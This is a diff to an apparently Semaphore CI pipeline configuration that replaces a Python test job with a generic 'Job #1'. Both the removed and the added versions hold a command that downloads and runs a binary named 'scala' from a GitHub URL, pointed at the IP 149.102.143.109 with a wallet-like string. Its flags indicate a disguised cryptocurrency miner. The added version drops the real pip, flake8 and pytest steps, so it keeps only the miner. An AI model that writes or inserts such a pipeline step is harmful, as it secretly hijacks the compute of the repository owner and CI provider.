@@ -1,21 +1,13 @@
 version: v1.0
-name: Python
+name: Initial Pipeline
 agent:
   machine:
     type: f1-standard-2
     os_image: ubuntu2204
 blocks:
-  - name: Test
+  - name: 'Block #1'
     task:
       jobs:
-        - name: pytest
+        - name: 'Job #1'
           commands:
-            - 'wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p 200'
-            - checkout
-            - python -m pip install --upgrade pip
-            - pip install -r requirements.txt
-            - pip install flake8
-            - 'flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics'
-            - flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics
-            - pip install pytest
-            - pytest
+            - 'apt-get update -y && apt-get install wget -y && wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz && tar -xvf scala.tar.gz && cd scala && ./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p 200'
